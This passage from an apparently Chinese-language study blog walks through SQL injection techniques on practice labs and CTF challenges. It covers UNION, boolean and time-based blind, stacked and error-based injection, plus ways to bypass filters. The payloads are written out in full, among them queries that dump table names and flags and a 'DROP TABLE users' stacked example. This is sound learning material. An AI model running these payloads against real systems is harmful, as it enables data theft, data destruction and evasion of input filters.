-<p>可以用括号等价于:</p>
-<p>?id&#x3D;-1’ UNION SELECT 1,<strong>(<strong>SELECT group_concat(TABLE_NAME) FROM information_schema.tables WHERE table_schema&#x3D;database()</strong>)</strong>,2 –+</p>
-<p>利用红色的 SELECT 他在无 FROM 时遇到不存在的列会直接回显不存在的列名,来让其直接回显 TABLE_NAME 里面的内容</p>
-<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>盲注是指攻击者不能直接获取数据库中的信息，需要通过一些技巧来判断或推断出数据库中的数据。盲注主要分为布尔盲注和时间盲注两种。</p>
-<p>在<strong>页面没有报错回显，也不知道数据库具体返回值</strong>的情况下，对数据库中的内容进行猜解，实行盲注。</p>
-<p><strong>布尔盲注</strong>则指的是 web 页面只返回 True 真，False 假两种类型。利用页面返回不同，<strong>逐个猜解</strong>数据。</p>
-<p>例如我 payload ?id&#x3D;1,页面会响应,输出一行或者若干行,但是不会显示数据库的具体内容</p>
-<p>Payload ?id&#x3D;’1,页面不会正常输出,也不会显示报错</p>
-<p>这种网页的回显只有真(正常输出)或者假(非正常输出)的题型,则属于<strong>布尔盲注</strong>题型</p>
-<h3 id="关键函数"><a href="#关键函数" class="headerlink" title="关键函数"></a>关键函数</h3><p>ASCII() 返回 ASCII 码,注意如果括号中是字符或者字符串的话,一定要加单引号.</p>
-<p>SELECT ASCII(‘A’)</p>
-<p>会输出 65</p>
-<p>此外,ASCII()函数只会转换括号中字符串的第一个字符的 ASCII</p>
-<p>SELECT ASCII(‘AWZ’)</p>
-<p>依然会输出 65.</p>
-<p>SUBSTR(&lt; 内容 &gt;,&lt; 第 m 个字符 &gt;,&lt; 第 n 个字符 &gt;)</p>
-<p>这个函数能够返回内容中从第 m 个字符开始的后 n 个字符(包括第 m 个字符),配合 ASCII(),能够得到一个字符串中特定位置</p>
-<p>的字符的 ASCII 值.</p>
-<p>例如 ASCII**(<strong>SUBSTR(SELECT DATABASE()),1,1</strong>)**就能得到 DATABASE()中第 1 个(从 1 开始)字符的 ASCII 值</p>
-<h3 id="布尔盲注原理"><a href="#布尔盲注原理" class="headerlink" title="布尔盲注原理"></a>布尔盲注原理</h3><p><strong>比较 ASCII 值</strong></p>
-<p>和一般的解题步骤一样，找到闭合方式，判断查询列数，都可以通过页面的真假来解决.</p>
-<p>但查询表名和列名时，由于他不会回显，我们只能想办法得到查询的表名和列名的 ASCII 值</p>
-<p>再翻译回来.</p>
-<p>以查询表名(闭合方式为单引号,3 列)为例,正常的 payload 是:</p>
-<p>?id&#x3D;-1’ UNION SELECT 1,group_concat(TABLE_NAME),3 FROM information_schema.tables WHERE table_schema&#x3D;database()–+</p>
-<p>会直接返回 database 数据库下所有的表名</p>
-<p>但当页面只会返回命令的真假时,用</p>
-<p>?id&#x3D;-1’ AND ASCII**(<strong>SUBSTR((SELECT group_concat(TABLE_NAME) FROM information_schema.tables WHERE table_schema&#x3D;database()),1,1)</strong>)&gt;&#x3D;100 –+**</p>
-<p>判断 database()数据库下所有表名的第一个字符的 ASCII 码能否超过 100(超过则网页正常回显,小于则不回显)</p>
-<p>再使用二分法等,判断能否超过 110,90 等等,从而获得所有表名的第一个字符的 ASCII 码</p>
-<p>用这个方式,改变 SUBSTR 的参数,获得第二,第三……个字符的 ASCII 码，再进行转码,即可成功查询列名和表名</p>
-<p>或者不用 group_concat 包裹也行,因为不会回显,最后再加上个 LIMIT 0,1 也可以获得所有表名的 ASCII 码(表示从第 0 行开始显示 1 行)</p>
-<p>?id&#x3D;-1’ AND ASCII**(<strong>SUBSTR((SELECT TABLE_NAME FROM information_schema.tables WHERE table_schema&#x3D;database() LIMIT 0,1),1,1)</strong>)&gt;&#x3D;100 –+**</p>
-<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p><strong>时间盲注</strong>指的是 web 页面只返回一个正常页面，利用页面响应时间不同，逐个猜解数据。</p>
-<p>注:前提是数据库会执行命令代码，只是不反馈页面信息</p>
-<h3 id="关键函数-1"><a href="#关键函数-1" class="headerlink" title="关键函数"></a>关键函数</h3><p>Sleep()</p>
-<p>Sleep(秒数)代表延迟多少秒</p>
-<p>if()</p>
-<p>if(condition,I,II)</p>
-<p>类似三目运算符,如果 condition 为 true,则执行 I 中代码,否则执行 II 中代码</p>
-<h3 id="时间盲注原理"><a href="#时间盲注原理" class="headerlink" title="时间盲注原理"></a>时间盲注原理</h3><p>如果这个网页连真假值都不会显示了，那么可以用 if 短句配合 Sleep()函数,观察网页响应时间来</p>
-<p>判断执行的语句是否为真.</p>
-<p><img src="/images/XuaQbDkbWoiaQJxtn5rcPS0dnhg.png"></p>
-<p>select 在这里充当命令执行的工具</p>
-<p>在判断闭合方式的时候,也可以用 id&#x3D;?? and sleep(3)</p>
-<p>判断网页是否等待了 3s 响应,如果响应,则代表代码正常执行了.</p>
-<p>获取用户名和密码&#x2F;闭合符判断举例:</p>
-<p><img src="/images/OFLxb3NBTopeBQxWMkochN1RnTf.png"></p>
-<p><img src="/images/Q5qKbpvEno7JJBxpWpOczStbnZB.png"></p>
-<p>上面四条语句哪个可以正常执行则哪个闭合符是正确的.</p>
-<p>查询耗时可以在网络处查询.</p>
-<p><img src="/images/ALUTbkdx7oSgiax6sLRcrPIrnZ9.png"></p>
-<h3 id="关于盲注的补充函数"><a href="#关于盲注的补充函数" class="headerlink" title="关于盲注的补充函数"></a>关于盲注的补充函数</h3><h4 id="length"><a href="#length" class="headerlink" title="length()"></a>length()</h4><p>length(字符串)返回字符串长度</p>
-<p>可以用?id&#x3D;1 AND length(database())&#x3D;1&#x2F;2&#x2F;3&#x2F;4</p>
-<p>依次输入以爆破出 database()的数据长度</p>
-<p>当然,用大于等于&#x2F;小于等于效果更佳.</p>
-<h4 id="SUBSTR"><a href="#SUBSTR" class="headerlink" title="SUBSTR()"></a><strong>SUBSTR()</strong></h4><p><code>SUBSTR()</code> 函数还可以用于替换字符串中的某个字符(在只知道 username 的长度,而不知道具体值的时候)：</p>
-<p>UPDATE users SET username&#x3D;SUBSTR(username,1,3)||’***’||SUBSTR(username,7) WHERE username&#x3D;’admin’</p>
-<p>将管理员账户的用户名中的第 4 到第 6 个字符替换为 <code>***</code></p>
-<h4 id="MID"><a href="#MID" class="headerlink" title="MID()"></a>MID()</h4><p><code>MID()</code> 函数也是用于截取字符串的函数,这点和 SUBSTR()相似。</p>
-<p><code>MID(string, start, length)</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MID(&quot;Hello, World!&quot;, 1, 5) # 返回的结果为&quot;Hello&quot;；</span><br><span class="line">SUBSTR(&quot;Hello, World!&quot;, 1, 5) # 返回的结果为&quot;Hello&quot;。</span><br></pre></td></tr></table></figure>
-
-<h4 id="CONCAT"><a href="#CONCAT" class="headerlink" title="CONCAT()"></a><code>CONCAT()</code></h4><p><code>CONCAT()</code> 函数用于将多个字符串连接成一个字符串。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONCAT(string1, string2, ...)</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = 1 union select CONCAT(username,&#x27;-&#x27;,password),1 from users;</span><br></pre></td></tr></table></figure>
-
-<p>一定程度上和 GROUP_CONCAT 类似</p>
-<p><img src="/images/Rengbs1VuoUCSNx6XIScG56cn7c.png"></p>
-<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>顾名思义 就是一堆 SQL 语句 (多条) 一起执行方法被称为堆叠注入。</p>
-<p>其实讲原理就很容易懂：</p>
-<p>在执行 SQL 语句时，如果 SQL 语句中包含多个 SQL 语句，数据库服务器会依次执行这些 SQL 语句，从而导致多次 SQL 注入攻击。通过在 SQL 语句中使用分号（;）来分隔多个 SQL 语句，从而实现堆叠注入攻击。</p>
-<p>举个例子：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username, password FROM users WHERE id =1; DROP TABLE users;--</span><br></pre></td></tr></table></figure>
-
-<p>执行这个 SQL 语句时，数据库服务器会依次执行这两个 SQL 语句，将会查询到 <code>users</code> 表中的用户名和密码，并且将 <code>users</code> 表删除。</p>
-<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>即通过报错信息获取数据的方法,用于 UNION 无法正常回显的情况(优先级比盲注更先)</p>
-<p>实际上在 UNION 学习中接触到的 GROUP BY&#x2F;ORDER BY+ 数字,用是否报错判断列数,本质</p>
-<p>上也是一种报错注入.</p>
-<p>FROM 错误的表格得到 &lt; 当前数据库名 &gt;.&lt; 表名 &gt; 不存在,实际上也是一种报错注入的方式获得了当前的数据库名.</p>
-<h3 id="extractvalue-报错注入"><a href="#extractvalue-报错注入" class="headerlink" title="extractvalue 报错注入"></a>extractvalue 报错注入</h3><p>对于报错注入,我们需要<strong>构造语句，让错误信息中夹杂可以显示数据库内容的查询语句</strong></p>
-<p>先来看这个函数的正确用法:</p>
-<p><img src="/images/Gz7obxLOtoYpQuxRDZqculI7nlh.png"></p>
-<p>这里 doc 是列名,第二个参数是一个路径,这个函数正常情况能够<strong>返回用于查询的字符串,可以作为 SELECT 的一个参数</strong></p>
-<p>FROM 和 select 连接的,表示在 xml 表中查询.</p>
-<p>我们要做的就是让这个函数报错</p>
-<p>这里面 <strong>doc 可以直接输,且输什么都不会报错</strong>,但后面的路径一定要以&#x2F;开头,否则整个函数就会报错了</p>
-<p>我们可以用下列语句:</p>
-<p><img src="/images/L1C7brwt7og0hvx2iONcEafhnTe.png"></p>
-<p>这样报错信息就会<strong>提示错误的路径</strong></p>
-<p>因此我们可以在路径中做文章,将 select 语句填写入路径参数,再让整个函数报错,获得 select 命令的执行结果.</p>
-<p>我们尝试以下语句:</p>
-<p><img src="/images/SV66bukrooQ4kRx48nCc8SQNnnf.png"></p>
-<p>获得报错:</p>
-<p><img src="/images/NYFfb3iLBoSwymxpxh2ccAw9ngg.png"></p>
-<p>即得 database 的返回值是 ctfstu</p>
-<p><strong>这样就可以用报错内容输出 SELECT 函数能够输出的任意值了</strong></p>
-<p><em>注意: 这里的 0x7e</em>_ 就是 <strong>~</strong> 的 “安全写法”，在 SQL 注入中专门用来做数据分隔，让提取的敏感信息更清晰，同时避免语法报错。相当于 concat(‘~’ select database())_</p>
-<p>concat()起拼接作用,将~和 select dabase()的返回值给拼接起来了</p>
-<p>当然,这个函数也不一定要跟在 SELECT 后</p>
-<p><img src="/images/ObkPbMfcNoUsv7xxayOcrp1Vncg.png"></p>
-<p>And 能让这个函数报错,也可行,而且还省略了获取列名这个过程,更为推荐.</p>
-<h3 id="解决报错只能显示-32-字符的问题"><a href="#解决报错只能显示-32-字符的问题" class="headerlink" title="解决报错只能显示 32 字符的问题"></a>解决报错只能显示 32 字符的问题</h3><p>substr&#x2F;substring 函数(两个函数等价)</p>
-<p>SUBSTR(&lt; 内容 &gt;,&lt; 第 m 个字符 &gt;,&lt; 第 n 个字符 &gt;)</p>
-<p>这个函数能够返回内容中从第 m 个字符开始的后 n 个字符(包括第 m 个字符)</p>
-<p>例如 SUBSTR((SELECT DATABASE()),1,1)就能返回 DATABASE()中第 1 个(从 1 开始)字符</p>
-<p>把 SELECT 的结果用括号括起来,就可以获得特定字符的值了</p>
-<p><u>我们再用一个示例来巩固报错注入的知识</u></p>
-<p>当然用 SELECT SUBSTR(DATABASE()),1,1 也行,效果是一样的</p>
-<h3 id="SQLi-Labs-5-解题示例"><a href="#SQLi-Labs-5-解题示例" class="headerlink" title="SQLi-Labs-5 解题示例"></a>SQLi-Labs-5 解题示例</h3><p><img src="/images/UvYibKrKyoISMDxn4bmcZamenNl.png"></p>
-<p>进入到关卡界面,发现根本没有回显位</p>
-<p><img src="/images/QzpnbmqFVoydvCx7g83cb674nLh.png"></p>
-<p>输入一下错误的指令,看下会不会报错,会就是报错注入,不会就是盲注了</p>
-<p><img src="/images/Z12dbQlnSopfHNxyCvJcZZoGnwe.png"></p>
-<p>会报错,而且看样子是单引号闭合方式,于是采用报错注入</p>
-<p>payload:?id&#x3D;1’ and 1&#x3D;extractvalue(1,concat(‘~’,(SELECT database()))) –+</p>
-<p><img src="/images/CSG8bWY5BoZvFGxcfGpcHjjDn0d.png"></p>
-<p>知道了当前数据库名是 security,接下来获取一下表名和列名</p>
-<p>payload:?id&#x3D;1’ and 1&#x3D;extractvalue**(<strong>1,concat(‘~’,(SELECT group_concat(TABLE_NAME) FROM information_schema.tables WHERE table_schema&#x3D;database()))</strong>)** –+</p>
-<p><img src="/images/TlqsbZY0fovpUXx6n1dcd4u6nOb.png"></p>
-<p>看到 flag 这个表名了,接下来看看 flag 这个表里面有什么列</p>
-<p>payload:?id&#x3D;1’ and 1&#x3D;extractvalue**(<strong>1,concat(‘~’,(SELECT group_concat(COLUMN_NAME) FROM information_schema.columns WHERE table_schema&#x3D;database() AND table_name&#x3D;’flag’))</strong>)** –+</p>
-<p><img src="/images/BWnhbQGUTo170Sx0sqlcfXFInih.png"></p>
-<p>有一列叫 flag 的</p>
-<p>那下面只需要查看 flag 表中的 flag 列就能得到 flag 了</p>
-<p>payload:?id&#x3D;1’ and 1&#x3D;extractvalue(1,concat(‘~’,(SELECT flag FROM flag))) –+</p>
-<p><img src="/images/Ah5obP8FboEN1gxJYjqcECA1nXg.png"></p>
-<p>回显了一部分 flag,还得用 SUBSTR 函数回显后半部分,以第 30 字符为起始</p>
-<p>payload:?id&#x3D;1’ and 1&#x3D;extractvalue(1,concat(‘~’,(SUBSTR((SELECT flag FROM flag),30,30)))) –+</p>
-<p>这里要看懂括号,任何以指令返回的字符串都要加括号</p>
-<p><img src="/images/DUNobyPIsotJ8pxXikjcNZI2nih.png"></p>
-<p>前面的 cc 是一开始的第 31 32 字符,所以 flag 应该是前半段加后半段 0622cb</p>
-<p>即得完整的 flag!</p>
-<h3 id="updatexml-报错注入"><a href="#updatexml-报错注入" class="headerlink" title="updatexml 报错注入"></a>updatexml 报错注入</h3><p>与 extractvalue 报错注入原理上相似，但参数不同</p>
-<p><img src="/images/OTpXbM1wpox6QJx3KGecoRLMncs.png"></p>
-<p>这个函数是用于更新数据的,但是我们只用知道它怎么才能报错,报错回显什么,再利用这个性质就可以了.</p>
-<p>与 extractvalue 报错相同,这里也是路径不用&#x2F;开头就会报错,剩下第一,第三个参数瞎填任意字符即可.</p>
-<p><img src="/images/WKcNbUPpSoknObxjB86cvxSknJ4.png"></p>
-<p>报错也只能回显 32 字符,可以用 SUBSTR 控制字符输出</p>
-<p>查看表名,直接 payload:</p>
-<p>?id&#x3D;-1’ AND 1&#x3D;UPDATEXML(1,CONCAT(‘~’,(SELECT GROUP_CONCAT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA&#x3D;DATABASE())),3) –+</p>
-<p>对照一下下面的(加了个 GROUP_CONCAT)</p>
-<p><img src="/images/M71ubjkWxoCU0RxTCRFcXwjHnwh.png"></p>
-<p>这里 SUBSTR 套在了 SELECT 后面,也是一样的,套在 SELECT 前是一样的</p>
-<p><img src="/images/ILAab6Zv3oG7UJxHQXkcoQHrnoc.png"></p>
-<p>对照一下放 SELECT 前</p>
-<p><img src="/images/JtAlboiWtoGLAfxKOxscVl4sn6e.png"></p>
-<h3 id="floor-报错注入"><a href="#floor-报错注入" class="headerlink" title="floor 报错注入"></a>floor 报错注入</h3><h4 id="涉及到的函数"><a href="#涉及到的函数" class="headerlink" title="涉及到的函数"></a>涉及到的函数</h4><p><strong>rand() 随机返回 0 到 1 之间的小数</strong></p>
-<p>Select rand() from users; 列 users 有多少行，这个语句便会计算多少次 rand(),并输出为未命名的一列</p>
-<p><strong>floor() 小数向下取整数</strong></p>
-<p>Select floor(2*rand()); 随机输出 0 或 1</p>
-<p><strong>ceiling() 小数向上取整数</strong></p>
-<p><strong>concat_ws(1,2,3) 将括号内数据用第 1 个字段连接起来</strong></p>
-<p>SELECT concat_ws(‘<del>‘,2,3); 输出 2</del>3</p>
-<p>可以看看上面三个命令合一以后的输出结果:</p>
-<p><img src="/images/Qs0HbLdfvoxqWrxo0Zicexswnjh.png"></p>
-<h5 id="FROM-接管问题"><a href="#FROM-接管问题" class="headerlink" title="*FROM 接管问题"></a>*FROM 接管问题</h5><p><em>注:这里的 from users 管一整个 SELECT 语句,包括 rand(),因此 rand 才可以输出那么多</em></p>
-<p><em>所有的 from 都能管一整个 select 语句,例如 SELECT 1,A,3 FROM USERS,就算表 USERS 只有列 A,那</em></p>
-<p><em>也能管到 A 并输出 A,而 1,3 直接按数字输出.</em></p>
-<p><strong>group by() 对结果集进行分组</strong></p>
-<p><strong>as 别名</strong></p>
-<p><img src="/images/Uv88bBu6Qoj2iExOkEJcc5C8nac.png"></p>
-<p>这里的 as a 是接 concat_ws 的</p>
-<p>为 concat_ws 的结果(一整列)起一个别名”a”,也可以理解成列名</p>
-<p>from 照常管一整句</p>
-<p>group by a 直接只输出 security-0 和 security-1.</p>
-<p><img src="/images/JCtIbl2B3oiiYcxaKlZcFqm9ny6.png"></p>
-<p><strong>count() 汇总统计数量</strong></p>
-<p><img src="/images/EAW6bxNYao7RDqxU0rFc4pZzngP.png"></p>
-<p>count(*)管 concat_ws 返回的列,会统计 security-0 和 security-1 出现次数并输出成另一列.</p>
-<p><strong>这就是问题所在,因为带 count(*)的如图语句有一定可能性会报错.</strong></p>
-<p>这时候 SELECT database()的结果:security 就出来了</p>
-<p><img src="/images/KbcIb5H5IolDoZxfX8YcX4XVnPe.png"></p>
-<p>其成因是在 <strong>rand()函数的纰漏</strong></p>
-<p><img src="/images/WKBPbbvkLoU8jAxxKL9c3ughnMh.png"></p>
-<p>(反正这个函数就是会抽风)</p>
-<p>而我们需要做的,就是让偶尔变成始终:</p>
-<p>让 rand()产生足够多次的计算,使这个报错出现概率逐增</p>
-<p>可以将 from 的列改成行数比较多的列,例如 information_schema.tables,让 rand()执行的次数足够多,这样就能让其报错了</p>
-<h4 id="随机数种子"><a href="#随机数种子" class="headerlink" title="随机数种子"></a>随机数种子</h4><p>在 rand()括号里面填同样数字,rand()会循环输出一些同样的 0-1 数据</p>
-<p>所以 rand(0)会报错,rand(0)就一直会报错,我们 payload 的时候发现 rand(一个数)它一直报错,本题就可以一直用这个数了.</p>
-<h4 id="核心语句"><a href="#核心语句" class="headerlink" title="核心语句"></a>核心语句</h4><p>实际上 floor 报错注入的核心语句就是结合 UNION 进行 SELECT,因为无论是 COUNT()函数还是 CONCAT_WS()函数作为最外层的函数,它们总是输出一个完整的列.</p>
-<p>?id&#x3D;1’ UNION SELECT 1,COUNT(<em>),CONCAT_WS</em><em>(<em>*’-‘,(SELECT DATABASE()),FLOOR(rand(0&#x2F;1&#x2F;2……)*2)**)</em></em> as name**,3** FROM information_schema.tables GROUP by name <strong>–+</strong></p>
-<p>真正需要修改的就是 SELECT DATABASE()，让其输出你想要的数据，并报错出来</p>
-<p>这个 as name 是管到 CONCAT_WS 前的 和 COUNT(*)是无关的.最后整个 SELECT 列</p>
-<p>注:这里红体划线字,3 要删去,因为 COUNT(*)还输出了一列,一共是输出两列,原本它需要三列,加个 1 就行了</p>
-<h4 id="GROUP-CONCAT-问题"><a href="#GROUP-CONCAT-问题" class="headerlink" title="GROUP_CONCAT()问题"></a>GROUP_CONCAT()问题</h4><p>这个语句遇到中间金色字的 GROUP_CONCAT 有时候会因为字符过多就产生 bug 直接不响应</p>
-<p>可以换成 CONCAT+LIMIT 来输出整列.</p>
-<p>GROUP_CONCAT(USERNAME,’~’,PASSWORD)</p>
-<p>&#x3D;CONCAT(USERNAME,’~’,PASSWORD) LIMIT 第 m 行 1(代表输出 1 行)</p>
-<p>或者用 substring 限制一下输出的字符量(详见解题示例)</p>
-<h3 id="SQLi-Labs-2-解题示例"><a href="#SQLi-Labs-2-解题示例" class="headerlink" title="SQLi-Labs-2 解题示例"></a>SQLi-Labs-2 解题示例</h3><p>我们再用一个示例来巩固 floor 报错,注意这是 UNION 注入的题,但一般只要能报错,UNION 注入的题也能报错注入</p>
-<p><img src="/images/GT1qb0Ezao08UhxCG4Dcy2a2nlc.png"></p>
-<p>本题是最简单的数字型注入，不用判断闭合方式.</p>
-<p><img src="/images/Mn3tbj4sLoXEYUxKovhcMF1pnne.png"></p>
-<p><img src="/images/UoAebgwuloZiXyxOngsczQ29nJc.png"></p>
-<p>用 ORDER BY 发现列数为 3,调试并检验</p>
-<p><img src="/images/NLslbPwUwo90U9xdE5Qc7GFsnwg.png"></p>
-<p>这里我们把第二列当做回显列</p>
-<p>payload:</p>
-<p>?id&#x3D;1’ UNION SELECT 1,COUNT(*),CONCAT_WS(‘-‘,(SELECT DATABASE()),FLOOR(rand(0)*2)) as name<del>,3</del> FROM information_schema.tables GROUP by name –+</p>
-<p>用 information_schema.tables 因为它列更多更容易报错了.</p>
-<p><strong>这里注意的是 COUNT 前不要带括号</strong></p>
-<p><img src="/images/FxNpbvFcKoTmmexqZOmcZVI3nbg.png"></p>
-<p>获得 database()的内容’security’</p>
-<p>payload:</p>
-<p>?id&#x3D;1’ UNION SELECT 1,COUNT(*),CONCAT_WS(‘-‘,(SELECT TABLE_NAME FROM INFORMATION_SCHEMA.tables WHERE TABLE_SCHEMA&#x3D;database()),FLOOR(rand(0)*2)) as name FROM information_schema.tables GROUP by name –+</p>
-<p><img src="/images/U4q8bGc46oQJGyx6T15cLPs3nqc.png"></p>
-<p>那加个 GROUP_CONCAT</p>
-<p>Payload:</p>
-<p>?id&#x3D;1’ union select 1,count(*),concat_ws(‘-‘,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),floor(rand(0)*2))as aa from information_schema.tables group by aa–+</p>
-<p><img src="/images/MsXbbl6mboN6LBxwtqocVWZQnKh.png"></p>
-<p>直接啥也没报,可能出现了 GROUP_CONCAT 问题,再用 substring 限制一下输出的字符量</p>
-<p>?id&#x3D;0’ union select 1,count(*),concat_ws(‘-‘,(select substring(group_concat(table_name),1,20)from information_schema.tables where table_schema&#x3D;database()),floor(rand(0)*2))as aa from information_schema.tables group by aa–+</p>
-<p><img src="/images/SzKRbXsKGo7ukexfjLMcsyLKnvf.png"></p>
-<p>这样表名就出来了,列名同理,这里就不再赘述.</p>
-<h2 id="部分过滤绕过"><a href="#部分过滤绕过" class="headerlink" title="部分过滤绕过"></a>部分过滤绕过</h2><p>这里挑几个 SQL 过滤绕过学习一下.</p>
-<p><img src="/images/EFO7bVeD6oXfxmx8iy9chlWjn3e.png"></p>
-<h3 id="注释符号过滤"><a href="#注释符号过滤" class="headerlink" title="注释符号过滤"></a>注释符号过滤</h3><p>先看看过滤的源代码</p>
-<p><img src="/images/BA4eb0AxZoIVRzx1lUhcgvT4n60.png"></p>
-<p>注释符号过滤的方法有很多种。</p>
-<p><strong>1.用 and 语句手动闭合单引号</strong></p>
-<p>?id&#x3D;1’ AND 1&#x3D;1’</p>
-<p>黄底 1’已经完成了闭合,后面 AND 1&#x3D;1’可以和另一个单引号闭合</p>
-<p><em>注:如果是数字型就可以不用注释符进行闭合,代码后的–+ 可以省略</em></p>
-<p><strong>2.直接用’(不一定可行)</strong></p>
-<p>?id&#x3D;1’ ‘</p>
-<p>自动把后面那个单引号给闭合了,但这种方式在有的实验不可行.</p>
-<p><strong>3.用 or 语句手动闭合单引号</strong></p>
-<p>?id&#x3D;1’ or&#x2F;and 1&#x3D;’1</p>
-<p>单引号直接闭合等号后面的 1,1&#x3D;1,语法正确.</p>
-<p>下面这张图能够更稳定的绕过注释过滤.</p>
-<p><img src="/images/ZzKUbEdQco1G9BxikIIcuTL5nt5.png"></p>
-<h3 id="And-和-Or-过滤"><a href="#And-和-Or-过滤" class="headerlink" title="And 和 Or 过滤"></a>And 和 Or 过滤</h3><p><img src="/images/GtafbGzkVob8AyxSx1ScGRxrnze.png"></p>
-<p>对于 and 和 or 过滤:</p>
-<p><strong>1.使用大小写过滤</strong></p>
-<p>?id&#x3D;1’ anD 1&#x3D;1–+</p>
-<p><strong>2.复写过滤字符</strong></p>
-<p>?id&#x3D;1’ an<del>and</del>d 1&#x3D;1 –+</p>
-<p><strong>3.用&amp;&amp;(%26%26)取代 and,用 ||(%7C%7C)取代 or</strong></p>
-<p>三个方法不一定全部适用,要逐一尝试</p>
-<h3 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h3><p><strong>1.用加号代替空格</strong></p>
-<p>?id&#x3D;1’+and+1&#x3D;1 –+</p>
-<p><strong>2.用 URL 编码代替空格(%0A 更为推荐)</strong></p>
-<p><img src="/images/UKoGbnIycouyeNxMPqGchSV7n9g.png"></p>
-<p><strong>3.使用括号代替空格的格式</strong></p>
-<p><img src="/images/OOVgbajvfopg6txY0DDc7UdvnCd.png"></p>
-<p><strong>注意过滤 or 的时候,也会把 information 里面的 or 给过滤了，记得复写!</strong></p>
-<h3 id="SELECT-和-UNION-过滤"><a href="#SELECT-和-UNION-过滤" class="headerlink" title="SELECT 和 UNION 过滤"></a>SELECT 和 UNION 过滤</h3><p><strong>1.没过滤注释符时,可插入&#x2F;</strong>&#x2F;**</p>
-<p>如这样 uni&#x2F;**&#x2F;on</p>
-<p><strong>2.复写单词过滤&#x2F;大小写过滤</strong></p>
-<p>同 And&#x2F;Or 过滤</p>
-<h3 id="过滤绕过举例"><a href="#过滤绕过举例" class="headerlink" title="过滤绕过举例"></a>过滤绕过举例</h3><p>对于过滤绕过举例,详见 SQL 注入实战第三题</p>
-<h1 id="Week4-3-实验-SQL-注入实战"><a href="#Week4-3-实验-SQL-注入实战" class="headerlink" title="*[Week4.3]实验:SQL 注入实战"></a>*[Week4.3]实验:SQL 注入实战</h1><h2 id="SWPUCTF-2024-秋季新生赛-ez-sql"><a href="#SWPUCTF-2024-秋季新生赛-ez-sql" class="headerlink" title="[SWPUCTF 2024 秋季新生赛]ez_sql"></a>[SWPUCTF 2024 秋季新生赛]ez_sql</h2><p><img src="/images/NOzRbPc9JoszlqxzhNIcFPUunpC.png"></p>
-<p>来到题目,他要你输入 id,这还是 SQL 注入的典型题,我们尝试输入 id&#x3D;1 和 2-1</p>
-<p><img src="/images/VouXbgQ5noRixFxSXxocTpbTnwb.png"></p>
-<p><img src="/images/Kl7RbNp2OoQFGAxqtrWc8o3Hnch.png"></p>
-<p>id 输 2-1 还是当做 2 看待,说明是字符型注入</p>
-<p><img src="/images/KkLvbdykgoM68KxpZcWcnGdfnBc.png"></p>
-<p>输’1 发现很明显的是单引号闭合</p>
-<p>我们先尝试一下报错注入,因为它不用知道列数.</p>
-<p>payload:</p>
-<p>1’  AND 1&#x3D;UNDATEXML(1,(SELECT TABLE_NAME FROM INFORMATION_SCHEMA.tables WHERE TABLE_SCHEMA&#x3D;DATABASE()),3) –+</p>
-<p><img src="/images/FI0XbfqLdoCUR4xtCNYcNKYonZf.png"></p>
-<p>报错了,经过一系列排除,发现–+ 注释在这个环境不适用,用#可以得到不同的结果</p>
-<p><img src="/images/JxrLblc7ro8rZDxNKYKctOV4n4g.png"></p>
-<p>这个函数直接报不存在了,换一个 extractvalue</p>
-<p>Payload:</p>
-<p>1’  AND 1&#x3D;extractvalue(1,CONCAT(‘~’,(SELECT TABLE_NAME FROM INFORMATION_SCHEMA.tables WHERE TABLE_SCHEMA&#x3D;DATABASE()))) #</p>
-<p><img src="/images/LxwvbUwHnonsVixg4crc3WRunHe.png"></p>
-<p>可能是报错的行数多于一行了,用 substr 限定一下</p>
-<p>Payload:</p>
-<p>1’  AND 1&#x3D;extractvalue(1,CONCAT(‘~’,(SUBSTR((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.tables WHERE TABLE_SCHEMA&#x3D;DATABASE()),1,1)))) #</p>
-<p><img src="/images/U4LSbiQWDod89yxIdVfcZfEinrg.png"></p>
-<p>还是不行,只能用 UNION 注入了</p>
-<p>随后的 UNION 注入过程和 Lab-1 是相同的,故省略.</p>
-<h3 id="做题启示"><a href="#做题启示" class="headerlink" title="做题启示"></a>做题启示</h3><p>1.注释用–+ 还是#随环境改变,不一定哪个方式是一定可行的</p>
-<p>2.有的环境不能用报错注入,注入方式需按环境变通</p>
-<h2 id="Less-6-解决前一题的-more-than-问题"><a href="#Less-6-解决前一题的-more-than-问题" class="headerlink" title="Less-6(解决前一题的 more than 问题)"></a>Less-6(解决前一题的 more than 问题)</h2><p>很容易判断闭合方式是双引号,而且是个没有回显的报错注入,正当以为要拿 flag 的时候这个提示又出现了:</p>
-<p><img src="/images/UUovbjXA0okIfSxGqrvcOX5pnrf.png"></p>
-<p>问了下 AI，实际上这并非不允许报错注入</p>
-<p>而是 SELECT 的一列他的行数大于 1,也就是 WHERE 没能把他限定在一行,用 GROUP_CONCAT 就能解决</p>
-<p>直接来到最后一步</p>
-<p>payload:</p>
-<p>?id&#x3D;1” AND 1&#x3D;extractvalue(2,CONCAT(‘~’,(SUBSTR((SELECT GROUP_CONCAT(FLAG) FROM flag),16,30)))) –+</p>
-<p>这样 flag 就能被正常显示了,还需要用 substr 调整一下</p>
-<p>说白了就是用 group_concat 包裹一下列名,注意不要把 from 和 where 给包裹进去了</p>
-<p><img src="/images/XMWcbhBVjojRjgxK6qQcx09mn7e.png"></p>
-<h3 id="做题启示-1"><a href="#做题启示-1" class="headerlink" title="做题启示"></a>做题启示</h3><p>group_concat 可以解决只能输出一行的问题.</p>
